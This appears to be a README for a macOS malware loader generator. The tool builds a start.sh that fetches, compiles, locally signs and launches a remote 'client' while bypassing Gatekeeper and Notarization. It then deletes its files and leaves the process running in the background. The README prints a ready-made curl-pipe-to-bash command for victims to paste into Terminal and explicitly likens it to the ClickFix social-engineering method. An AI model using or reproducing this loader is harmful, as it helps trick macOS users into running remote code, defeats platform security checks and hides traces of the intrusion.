Loader.sh compiles the app bundle on the user's device, automatically installing all dependencies, locally signs it, and launches it, bypassing Gatekeeper/Notarization.

When started, Loader.sh prompts for two URLs: one for the client's ZIP file and another for the future location of start.sh on the server. It also asks for the path to the Client folder (or whatever you named it the folder containing the client source code that needs to be compiled).

The script copies the specified folder to the working directory, renames it to scr, and creates a ready-to-use ZIP archive scr.zip, which you simply need to upload to the server at the URL you provided in the ZIP path step.

Upon completion of Loader.sh, a start.sh file appears in the working directory. This file serves as the loader: it downloads the archive from the server, compiles the app, and then deletes everything. All of this is handled automatically by start.sh.

### What is the scr folder?
It is a copy of the Client folder with all unnecessary files removed. Only the source code and the build.sh script remain. Loader.sh does this cleanup automatically.

## How the generated start.sh works step by step:

- Downloads the ZIP archive from the specified URL
- Unzips it into the current directory, creating a **scr** folder
- Enters the **scr** folder and runs **build.sh** (in the background)
- Waits 3 minutes
- Deletes all files inside **scr** and the ZIP file itself
- The client continues running in a background process

## Requirements

- macOS
- bash, curl, unzip

## Quick Start

```bash
chmod +x loader.sh
./loader.sh
```

The script will prompt you to enter:
1. URL to the client ZIP file
2. URL/path where **start.sh** will be hosted on the server
3. Path to the **Client** folder (or the folder containing the client module)

After that, the script will create the **start.sh** file in the current directory and output a ready-to-use terminal command. This command can be used similarly to the ClickFix method.

Upload **start.sh** to the server at the specified URL.

## Examples

Example URL for the ZIP archive:  
`http://localhost:8080/scr.zip`

Example URL for **start.sh**:  
`http://localhost:8080/start.sh`

Example path to the client folder:  
`/Users/ServerShell/Client`

## Execution Result Example

```bash
chmod +x loader.sh
./loader.sh
Enter URL to ZIP file:
http://localhost:8080/scr.zip
Enter URL to start.sh:
http://localhost:8080/start.sh
Enter path to Client folder:
/Users/ServerShell/Client

Generation completed! start.sh created.
Now upload start.sh to the server at URL: http://localhost:8080/start.sh
Ready command for terminal:
if [[ "$OSTYPE" != "darwin"* ]]; then exit 1; fi; /bin/bash -c "$(curl -fsSL http://localhost:8080/start.sh)"
```

## Usage

The user should copy and paste the displayed command into the Terminal on macOS. The command checks the OS and downloads/executes **start.sh** directly in memory. In turn, **start.sh** will:

- Download the client ZIP
- Compile the app, automatically installing all dependencies
- Locally sign and run it

After 3 minutes, **start.sh** deletes all client files from disk. The client continues running in a detached background child process.
```
